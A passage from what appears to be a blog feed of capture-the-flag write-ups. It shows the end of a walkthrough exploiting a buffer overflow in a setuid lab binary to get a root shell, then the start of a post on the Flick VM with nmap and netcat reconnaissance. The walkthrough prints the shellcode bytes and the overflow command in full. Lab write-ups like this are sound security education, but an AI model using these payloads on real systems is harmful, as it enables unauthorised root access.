</span><span class='line'><span class="o">[</span>----------------------------------registers-----------------------------------<span class="o">]</span>
</span><span class='line'>EAX: 0x12c
</span><span class='line'>EBX: 0xb7fbeff4 --&gt; 0x15ed7c
</span><span class='line'>ECX: 0xbffff4d8 --&gt; 0xb7fbf4e0 --&gt; 0xfbad2a84
</span><span class='line'>EDX: 0xb7fc0360 --&gt; 0x0
</span><span class='line'>ESI: 0x0
</span><span class='line'>EDI: 0x0
</span><span class='line'>EBP: 0x41414141 <span class="o">(</span><span class="s1">&#39;AAAA&#39;</span><span class="o">)</span>
</span><span class='line'>ESP: 0xbffff610 <span class="o">(</span><span class="s1">&#39;A&#39;</span> &lt;repeats <span class="m">28</span> <span class="nb">times</span>&gt;<span class="o">)</span>
</span><span class='line'>EIP: 0x41414141 <span class="o">(</span><span class="s1">&#39;AAAA&#39;</span><span class="o">)</span>
</span><span class='line'>EFLAGS: 0x10296 <span class="o">(</span>carry PARITY ADJUST zero SIGN <span class="nb">trap </span>INTERRUPT direction overflow<span class="o">)</span>
</span><span class='line'><span class="o">[</span>-------------------------------------code-------------------------------------<span class="o">]</span>
</span><span class='line'>Invalid <span class="nv">$PC</span> address: 0x41414141
</span><span class='line'><span class="o">[</span>------------------------------------stack-------------------------------------<span class="o">]</span>
</span><span class='line'>0000<span class="p">|</span> 0xbffff610 <span class="o">(</span><span class="s1">&#39;A&#39;</span> &lt;repeats <span class="m">28</span> <span class="nb">times</span>&gt;<span class="o">)</span>
</span><span class='line'>0004<span class="p">|</span> 0xbffff614 <span class="o">(</span><span class="s1">&#39;A&#39;</span> &lt;repeats <span class="m">24</span> <span class="nb">times</span>&gt;<span class="o">)</span>
</span><span class='line'>0008<span class="p">|</span> 0xbffff618 <span class="o">(</span><span class="s1">&#39;A&#39;</span> &lt;repeats <span class="m">20</span> <span class="nb">times</span>&gt;<span class="o">)</span>
</span><span class='line'>0012<span class="p">|</span> 0xbffff61c <span class="o">(</span><span class="s1">&#39;A&#39;</span> &lt;repeats <span class="m">16</span> <span class="nb">times</span>&gt;<span class="o">)</span>
</span><span class='line'>0016<span class="p">|</span> 0xbffff620 <span class="o">(</span><span class="s1">&#39;A&#39;</span> &lt;repeats <span class="m">12</span> <span class="nb">times</span>&gt;<span class="o">)</span>
</span><span class='line'>0020<span class="p">|</span> 0xbffff624 <span class="o">(</span><span class="s2">&quot;AAAAAAAA&quot;</span><span class="o">)</span>
</span><span class='line'>0024<span class="p">|</span> 0xbffff628 <span class="o">(</span><span class="s2">&quot;AAAA&quot;</span><span class="o">)</span>
</span><span class='line'>0028<span class="p">|</span> 0xbffff62c --&gt; 0x8048200 --&gt; 0x0
</span><span class='line'><span class="o">[</span>------------------------------------------------------------------------------<span class="o">]</span>
</span><span class='line'>Legend: code, data, rodata, value
</span><span class='line'>Stopped reason: SIGSEGV
</span><span class='line'>0x41414141 in ?? <span class="o">()</span>
</span><span class='line'>gdb-peda<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>Standard buffer overflow process here (I don&rsquo;t want to teach you how to suck eggs tbh, there&rsquo;s enough resources online). EIP is at 269, so&hellip;</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>gdb-peda<span class="nv">$ </span>r <span class="k">$(</span>python -c <span class="s1">&#39;print &quot;A&quot;*268 + &quot;BBBB&quot;&#39;</span><span class="k">)</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
</span><span class='line'><span class="o">[</span>----------------------------------registers-----------------------------------<span class="o">]</span>
</span><span class='line'>EAX: 0x110
</span><span class='line'>EBX: 0xb7fbeff4 --&gt; 0x15ed7c
</span><span class='line'>ECX: 0xbffff4f8 --&gt; 0xb7fbf4e0 --&gt; 0xfbad2a84
</span><span class='line'>EDX: 0xb7fc0360 --&gt; 0x0
</span><span class='line'>ESI: 0x0
</span><span class='line'>EDI: 0x0
</span><span class='line'>EBP: 0x41414141 <span class="o">(</span><span class="s1">&#39;AAAA&#39;</span><span class="o">)</span>
</span><span class='line'>ESP: 0xbffff630 --&gt; 0x0
</span><span class='line'>EIP: 0x42424242 <span class="o">(</span><span class="s1">&#39;BBBB&#39;</span><span class="o">)</span>
</span><span class='line'>EFLAGS: 0x10292 <span class="o">(</span>carry parity ADJUST zero SIGN <span class="nb">trap </span>INTERRUPT direction overflow<span class="o">)</span>
</span><span class='line'><span class="o">[</span>-------------------------------------code-------------------------------------<span class="o">]</span>
</span><span class='line'>Invalid <span class="nv">$PC</span> address: 0x42424242
</span><span class='line'><span class="o">[</span>------------------------------------stack-------------------------------------<span class="o">]</span>
</span><span class='line'>0000<span class="p">|</span> 0xbffff630 --&gt; 0x0
</span><span class='line'>0004<span class="p">|</span> 0xbffff634 --&gt; 0xbffff6d4 --&gt; 0xbffff7f8 <span class="o">(</span><span class="s2">&quot;/root/troll/r00t&quot;</span><span class="o">)</span>
</span><span class='line'>0008<span class="p">|</span> 0xbffff638 --&gt; 0xbffff6e0 --&gt; 0xbffff91a <span class="o">(</span><span class="s2">&quot;SHELL=/bin/bash&quot;</span><span class="o">)</span>
</span><span class='line'>0012<span class="p">|</span> 0xbffff63c --&gt; 0xb7fe0860 --&gt; 0xb7e60000 --&gt; 0x464c457f
</span><span class='line'>0016<span class="p">|</span> 0xbffff640 --&gt; 0xb7ff6821 <span class="o">(</span>mov    eax,DWORD PTR <span class="o">[</span>ebp-0x10<span class="o">])</span>
</span><span class='line'>0020<span class="p">|</span> 0xbffff644 --&gt; 0xffffffff
</span><span class='line'>0024<span class="p">|</span> 0xbffff648 --&gt; 0xb7ffeff4 --&gt; 0x1cf2c
</span><span class='line'>0028<span class="p">|</span> 0xbffff64c --&gt; 0x8048278 <span class="o">(</span><span class="s2">&quot;__libc_start_main&quot;</span><span class="o">)</span>
</span><span class='line'><span class="o">[</span>------------------------------------------------------------------------------<span class="o">]</span>
</span><span class='line'>Legend: code, data, rodata, value
</span><span class='line'>Stopped reason: SIGSEGV
</span><span class='line'>0x42424242 in ?? <span class="o">()</span>
</span><span class='line'>gdb-peda<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>OK, easy peasy. GDB identifies that there isn&rsquo;t a jmp esp in the binary, but it is a dynamically linked binary, so ret2libc is possible. But why make it more complicated for ourselves ? Naaah. Our shellcode can be placed in an environment value</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nb">export </span><span class="nv">SHELLCODE</span><span class="o">=</span><span class="k">$(</span>python -c <span class="s1">&#39;print &quot;\x90&quot;*100 + &quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80&quot;&#39;</span><span class="k">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>Which can be located within GDB</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>gdb ./r00t
</span><span class='line'>GNU gdb <span class="o">(</span>Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1<span class="o">)</span> 7.4-2012.04
</span><span class='line'>Copyright <span class="o">(</span>C<span class="o">)</span> <span class="m">2012</span> Free Software Foundation, Inc.
</span><span class='line'>License GPLv3+: GNU GPL version <span class="m">3</span> or later &lt;http://gnu.org/licenses/gpl.html&gt;
</span><span class='line'>This is free software: you are free to change and redistribute it.
</span><span class='line'>There is NO WARRANTY, to the extent permitted by law.  Type <span class="s2">&quot;show copying&quot;</span>
</span><span class='line'>and <span class="s2">&quot;show warranty&quot;</span> <span class="k">for</span> details.
</span><span class='line'>This GDB was configured as <span class="s2">&quot;i686-linux-gnu&quot;</span>.
</span><span class='line'>For bug reporting instructions, please see:
</span><span class='line'>&lt;http://bugs.launchpad.net/gdb-linaro/&gt;...
</span><span class='line'>Reading symbols from /nothing_to_see_here/choose_wisely/door1/r00t...done.
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> <span class="nb">break </span>main
</span><span class='line'>Breakpoint <span class="m">1</span> at 0x8048450: file bof.c, line 7.
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> run
</span><span class='line'>Starting program: /nothing_to_see_here/choose_wisely/door1/r00t
</span><span class='line'>
</span><span class='line'>Breakpoint 1, main <span class="o">(</span><span class="nv">argc</span><span class="o">=</span>1, <span class="nv">argv</span><span class="o">=</span>0xbffffcb4<span class="o">)</span> at bof.c:7
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> 7 bof.c: No such file or directory.
</span><span class='line'>x/100xw <span class="nv">$esp</span>
</span><span class='line'>0xbffffb00:   0x00000000  0x00000000  0x00000001  0x000008b0
</span><span class='line'>0xbffffb10:   0x40024b48  0x40024858  0x08048278  0x40037158
</span><span class='line'>0xbffffb20:   0x0804821c  0x00000001  0x400c2230  0x400c245e
</span><span class='line'>0xbffffb30:   0xbffffb68  0x40020ff4  0x40021ad0  0xbffffc54
</span><span class='line'>0xbffffb40:   0xbffffc10  0x40009ed9  0xbffffbf0  0x0804821c
</span><span class='line'>0xbffffb50:   0xbffffbd8  0x40021a74  0x00000000  0x40024b48
</span><span class='line'>0xbffffb60:   0x00000001  0x00000000  0x00000001  0x40021918
</span><span class='line'>0xbffffb70:   0x00000000  0x00000000  0x00000000  0x401cfff4
</span><span class='line'>0xbffffb80:   0xbffffbce  0xbffffbcf  0x00000001  0x400c27b9
</span><span class='line'>0xbffffb90:   0xbffffbcf  0xbffffbce  0x00000000  0x40015fec
</span><span class='line'>0xbffffba0:   0xbffffc54  0x40022000  0x00000000  0x4005cc73
</span><span class='line'>0xbffffbb0:   0x08048278  0x00000000  0x00c10000  0x00000001
</span><span class='line'>0xbffffbc0:   0xbffffdc2  0x0000002f  0xbffffc1c  0x401cfff4
</span><span class='line'>0xbffffbd0:   0x080484b0  0x08049ff4  0x00000001  0x0804831d
</span><span class='line'>0xbffffbe0:   0x401d03e4  0x0000000d  0x08049ff4  0x080484d1
</span><span class='line'>0xbffffbf0:   0xffffffff  0x4005cdc6  0x401cfff4  0x4005ce55
</span><span class='line'>0xbffffc00:   0x4000f280  0x00000000  0x080484b9  0x401cfff4
</span><span class='line'>0xbffffc10:   0x080484b0  0x00000000  0x00000000  0x400434d3
</span><span class='line'>0xbffffc20:   0x00000001  0xbffffcb4  0xbffffcbc  0x40024858
</span><span class='line'>0xbffffc30:   0x00000000  0xbffffc1c  0xbffffcbc  0x00000000
</span><span class='line'>0xbffffc40:   0x0804823c  0x401cfff4  0x00000000  0x00000000
</span><span class='line'>0xbffffc50:   0x00000000  0xdd889bc6  0x2a19fe39  0x00000000
</span><span class='line'>0xbffffc60:   0x00000000  0x00000000  0x00000001  0x08048390
</span><span class='line'>0xbffffc70:   0x00000000  0x400146b0  0x400433e9  0x40020ff4
</span><span class='line'>0xbffffc80:   0x00000001  0x08048390  0x00000000  0x080483b1
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span>
</span><span class='line'>0xbffffc90:   0x08048444  0x00000001  0xbffffcb4  0x080484b0
</span><span class='line'>0xbffffca0:   0x08048520  0x4000f280  0xbffffcac  0x40021918
</span><span class='line'>0xbffffcb0:   0x00000001  0xbffffdc2  0x00000000  0xbffffdf0
</span><span class='line'>0xbffffcc0:   0xbffffe77  0xbffffe87  0xbffffea9  0xbffffeb3
</span><span class='line'>0xbffffcd0:   0xbffffebe  0xbffffed2  0xbfffff1f  0xbfffff2e
</span><span class='line'>0xbffffce0:   0xbfffff5b  0xbfffff6c  0xbfffff75  0xbfffff85
</span><span class='line'>0xbffffcf0:   0xbfffff8d  0xbfffff9a  0x00000000  0x00000020
</span><span class='line'>0xbffffd00:   0x40022414  0x00000021  0x40022000  0x00000010
</span><span class='line'>0xbffffd10:   0x0fabfbff  0x00000006  0x00001000  0x00000011
</span><span class='line'>0xbffffd20:   0x00000064  0x00000003  0x08048034  0x00000004
</span><span class='line'>0xbffffd30:   0x00000020  0x00000005  0x00000009  0x00000007
</span><span class='line'>0xbffffd40:   0x40000000  0x00000008  0x00000000  0x00000009
</span><span class='line'>0xbffffd50:   0x08048390  0x0000000b  0x000003ea  0x0000000c
</span><span class='line'>0xbffffd60:   0x000003ea  0x0000000d  0x000003ea  0x0000000e
</span><span class='line'>0xbffffd70:   0x000003ea  0x00000017  0x00000001  0x00000019
</span><span class='line'>0xbffffd80:   0xbffffdab  0x0000001f  0xbfffffce  0x0000000f
</span><span class='line'>0xbffffd90:   0xbffffdbb  0x00000000  0x00000000  0x00000000
</span><span class='line'>0xbffffda0:   0x00000000  0x00000000  0xf6000000  0x6d8240c1
</span><span class='line'>0xbffffdb0:   0xc85c9138  0x1f1bbf89  0x692ef87a  0x00363836
</span><span class='line'>0xbffffdc0:   0x6e2f0000  0x6968746f  0x745f676e  0x65735f6f
</span><span class='line'>0xbffffdd0:   0x65685f65  0x632f6572  0x736f6f68  0x69775f65
</span><span class='line'>0xbffffde0:   0x796c6573  0x6f6f642f  0x722f3172  0x00743030
</span><span class='line'>0xbffffdf0:   0x4c454853  0x444f434c  0x90903d45  0x90909090
</span><span class='line'>0xbffffe00:   0x90909090  0x90909090  0x90909090  0x90909090
</span><span class='line'>0xbffffe10:   0x90909090  0x90909090  0x90909090  0x90909090
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>Shellcode starts around 0xbffffe10, so we just change our EIP to that memory location to run the shellcode. As proven within GDB, it runs as expected and /bin/dash is executed (GDB strips EUID though)</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="o">(</span>gdb<span class="o">)</span> r <span class="k">$(</span>python -c <span class="s1">&#39;print &quot;A&quot;*268 + &quot;\x10\xfe\xff\xbf&quot;&#39;</span><span class="k">)</span>
</span><span class='line'>Starting program: /nothing_to_see_here/choose_wisely/door1/r00t <span class="k">$(</span>python -c <span class="s1">&#39;print &quot;A&quot;*268 + &quot;\x10\xfe\xff\xbf&quot;&#39;</span><span class="k">)</span>
</span><span class='line'>process <span class="m">1575</span> is executing new program: /bin/dash
</span><span class='line'>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1002<span class="o">(</span>noob<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>noob<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1002<span class="o">(</span>noob<span class="o">)</span>
</span><span class='line'><span class="nb">exit</span>
</span><span class='line'><span class="o">[</span>Inferior <span class="m">1</span> <span class="o">(</span>process 1575<span class="o">)</span> exited with code 0177<span class="o">]</span>
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>When run outside of GDB, we get dropped to a root shell</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>./r00t <span class="k">$(</span>python -c <span class="s1">&#39;print &quot;A&quot;*268 + &quot;\x10\xfe\xff\xbf&quot;&#39;</span><span class="k">)</span>
</span><span class='line'>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1002<span class="o">(</span>noob<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>noob<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,1002<span class="o">(</span>noob<span class="o">)</span>
</span><span class='line'><span class="nb">cd</span> /root
</span><span class='line'>ls -ls
</span><span class='line'>total 40
</span><span class='line'><span class="m">4</span> -rw-r--r-- <span class="m">1</span> root   root     <span class="m">68</span> Oct  <span class="m">6</span> 18:32 Proof.txt
</span><span class='line'><span class="m">4</span> drwxr-xr-x <span class="m">5</span> root   root   <span class="m">4096</span> Oct  <span class="m">4</span> 22:35 core1
</span><span class='line'><span class="m">4</span> drwxr-xr-x <span class="m">5</span> root   root   <span class="m">4096</span> Oct  <span class="m">4</span> 22:36 core2
</span><span class='line'><span class="m">4</span> drwxr-xr-x <span class="m">5</span> root   root   <span class="m">4096</span> Oct  <span class="m">4</span> 22:36 core3
</span><span class='line'><span class="m">4</span> drwxr-xr-x <span class="m">5</span> root   root   <span class="m">4096</span> Oct  <span class="m">4</span> 22:36 core4
</span><span class='line'><span class="m">4</span> drwxr-xr-x <span class="m">2</span> root   root   <span class="m">4096</span> Oct  <span class="m">5</span> 21:14 goal
</span><span class='line'><span class="m">4</span> drwxr-xr-x <span class="m">2</span> root   root   <span class="m">4096</span> Oct  <span class="m">6</span> 18:36 hardmode
</span><span class='line'><span class="m">4</span> -rw-r--r-- <span class="m">1</span> maleus maleus <span class="m">1474</span> Oct  <span class="m">4</span> 00:28 lmao.zip
</span><span class='line'><span class="m">4</span> -rw-r--r-- <span class="m">1</span> root   root    <span class="m">828</span> Oct  <span class="m">4</span> 22:43 ran_dir.py
</span><span class='line'><span class="m">4</span> drwxr-xr-x <span class="m">2</span> root   root   <span class="m">4096</span> Oct  <span class="m">6</span> 18:35 reboot
</span><span class='line'>cat Proof.txt
</span><span class='line'>You win this <span class="nb">time </span>young Jedi...
</span><span class='line'>
</span><span class='line'>a70354f0258dcc00292c72aab3c8b1e4
</span></code></pre></td></tr></table></div></figure>


<p><img src="http://cdn-media-2.lifehack.org/wp-content/files/2014/08/Getting-it-done-gif.gif" alt="" /></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[How Many Hackers Does It Take To Change A Lightbulb ?]]></title>
    <link href="http://recrudesce.github.io/2014/08/13/how-many-hackers-does-it-take-to-change-a-lightbulb/"/>
    <updated>2014-08-13T01:00:28+01:00</updated>
    <id>http://recrudesce.github.io/2014/08/13/how-many-hackers-does-it-take-to-change-a-lightbulb</id>
    <content type="html"><![CDATA[<p>Whilst in the middle of cracking <a href="http://vulnhub.com/entry/xerxes-2,97/">Xerxes2</a>, <a href="https://twitter.com/leonjza">leonjza</a> decided to release <a href="http://vulnhub.com/entry/flick-1,99/">Flick</a> - a CTF that is sure to tax minds.  Naturally I decided to make myself feel like an unskilled loser, and downloaded it. Here&rsquo;s the story of how I rooted Flick first.</p>

<blockquote><p>root@flick:~# id<br/>uid=0(root) gid=0(root) groups=0(root)<br/>First ! @leonjza @VulnHub #flick #boot2root #vulnhub</p><footer><strong>Russ Watts (@recrudesce)</strong> <cite><a href='https://twitter.com/recrudesce/statuses/499168321150124033'>twitter.com/recrudesce/statuses/&hellip;</a></cite></footer></blockquote>




<!-- more -->


<h2>&lsquo;Avin&rsquo; a Butchers</h2>

<p>Blah blah NMAP blah ;)</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# nmap -sS -O -p1-65535 -T4 192.168.0.106
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.46 <span class="o">(</span> http://nmap.org <span class="o">)</span> at 2014-08-08 22:39 BST
</span><span class='line'>Nmap scan report <span class="k">for</span> 192.168.0.106
</span><span class='line'>Host is up <span class="o">(</span>0.00s latency<span class="o">)</span>.
</span><span class='line'>Not shown: <span class="m">65533</span> closed ports
</span><span class='line'>PORT     STATE SERVICE VERSION
</span><span class='line'>22/tcp   open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.1 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
</span><span class='line'><span class="p">|</span> ssh-hostkey:
</span><span class='line'><span class="p">|</span>   <span class="m">1024</span> 04:d0:8d:4d:ee:87:30:e7:60:82:63:d3:a8:6e:4b:ac <span class="o">(</span>DSA<span class="o">)</span>
</span><span class='line'><span class="p">|</span>   <span class="m">2048</span> 64:ec:a9:9b:0b:c0:11:d4:08:63:cf:83:e1:db:23:9a <span class="o">(</span>RSA<span class="o">)</span>
</span><span class='line'><span class="p">|</span>_  <span class="m">256</span> 2d:32:93:ce:0e:54:3f:84:ee:01:c7:c0:bb:68:e2:02 <span class="o">(</span>ECDSA<span class="o">)</span>
</span><span class='line'>8881/tcp open  unknown
</span><span class='line'>
</span><span class='line'>Network Distance: <span class="m">1</span> hop
</span><span class='line'>Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</span></code></pre></td></tr></table></div></figure>


<p>SSH and a random unknown port - ominous. A quick netcat to the port presents us with a request for a password</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# nc 192.168.0.106 8881
</span><span class='line'>Welcome to the admin server. A correct password will <span class="s1">&#39;flick&#39;</span> the switch and open a new door:
</span><span class='line'>&gt;
</span></code></pre></td></tr></table></div></figure>


<p>Anything you type in just gets repeated back to you. I also checked for buffer overflows and format string vulns, but no avail - looks like I need a password.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>Welcome to the admin server. A correct password will <span class="s1">&#39;flick&#39;</span> the switch and open a new door:
</span><span class='line'>&gt; AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
</span><span class='line'>OK: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
</span><span class='line'>
</span><span class='line'>&gt; %s%s%s%s
</span><span class='line'>OK: %s%s%s%s
</span><span class='line'>
</span><span class='line'>&gt; wut ?
</span><span class='line'>OK: wut ?
</span><span class='line'>
</span><span class='line'>&gt;
</span></code></pre></td></tr></table></div></figure>


<p><img src="http://static.fjcdn.com/gifs/MFW+someone+tries+to+open+IE.+that+makes+me+a_c3c81f_4698730.gif" alt="" /> OK, so not knowing the password, I decided to check out SSH.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
